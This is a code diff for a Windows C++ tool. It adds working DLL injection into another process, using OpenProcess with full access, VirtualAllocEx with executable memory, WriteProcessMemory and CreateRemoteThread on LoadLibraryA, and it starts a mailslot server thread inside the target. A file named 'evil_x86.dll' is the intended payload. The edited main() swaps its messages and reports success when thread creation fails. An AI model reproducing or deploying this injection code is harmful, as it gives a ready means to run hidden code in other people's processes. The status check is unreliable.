@@ -3,9 +3,72 @@
 
 #include "program_result.h"
 #include "injection/interproc_coms.h"
+#include <injection/injector.h>
+#include "injector.h"
+
+using namespace error_handling;
 
 char evilDLL[] = "C:\\evil_x86.dll";
 unsigned int evilLen = sizeof(evilDLL) + 1;
+
+namespace injection {
+ProgramResult InjectDLLOnProcess(DWORD pid, std::string dll_path) {
+  ProgramResult result = OkResult("Process injected");
+  // RETURN handle through arguments
+  HMODULE hKernel32 = GetModuleHandleA("Kernel32");
+  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");
+  HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+
+  if (process == NULL) return ErrorResult("[INJ] Could not open remote process");
+
+  // allocate memory buffer for remote process
+  LPVOID remote_buffer;
+  remote_buffer = VirtualAllocEx(process, NULL, dll_path.length(), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+  if (remote_buffer != NULL) {
+    BOOL res = WriteProcessMemory(process, remote_buffer, dll_path.c_str(), dll_path.length(), NULL);
+    if (res != 0) {
+      HANDLE thread_handle = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)lb, remote_buffer, 0, NULL);
+      if (thread_handle == NULL) result = ErrorResult("[INJ] Failed to start a thread on the target process");
+      else CloseHandle(thread_handle);
+    } else result = ErrorResult("[INJ] Could not write into the remote buffer");
+  } else result = ErrorResult("[INJ] Failed to allocate memory in the remote process");
+
+  CloseHandle(process);
+  return result;
+}
+
+ProgramResult StartServer(DWORD pid, HANDLE* thread_handle) {
+  // GetProcAddress to get the function and CreateRemoteThread to start it
+  return ErrorResult("Not implemented");
+}
+
+error_handling::ProgramResult StartMailSlotExporter(DWORD pid, HANDLE *thread_handle) {
+  // TODO get the DLL from a global config file
+  HMODULE injected_dll = LoadLibraryA("");
+  FARPROC start_server_function = GetProcAddress(injected_dll, "StartMailSlotExporter");
+  FreeLibrary(injected_dll);
+
+  // Open process
+  HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+  if (process == NULL) return ErrorResult("Could not open remote process");
+
+  *thread_handle = CreateRemoteThread(
+    process, NULL, 0,
+    (LPTHREAD_START_ROUTINE) start_server_function,
+    NULL, 0, NULL
+  );
+  
+  CloseHandle(process);
+  if (*thread_handle == NULL) return ErrorResult("Could not start a thread with the MailSlot server"); 
+  else return OkResult("Successfully started MailSlot server on remote process");
+}
+
+ProgramResult StopServer(DWORD pid) {
+  // GetProcAddress to get the function and CreateRemoteThread to start it
+  return ErrorResult("Not implemented");
+}
+
+} // namespace injection
 
 int main(int argc, char* argv[]) {
   HANDLE target_process; // process handle
@@ -57,7 +120,9 @@ int main(int argc, char* argv[]) {
   if (evil_dll != NULL) {
     printf(" [i] Loaded DLL in current process\n");
     FARPROC start_server_func = GetProcAddress(evil_dll, "StartServer");
-    CreateRemoteThread(target_process, NULL, 0, (LPTHREAD_START_ROUTINE) start_server_func, NULL, 0, NULL);
+    HANDLE res = CreateRemoteThread(target_process, NULL, 0, (LPTHREAD_START_ROUTINE) start_server_func, NULL, 0, NULL);
+    if (res == NULL) printf(" [x] Successfully started thread with server on tje target process");
+    else printf(" [x] Error starting new thread on the target process\n");
   } else printf("[x] Error loading custom DLL");
   
   CloseHandle(target_process);
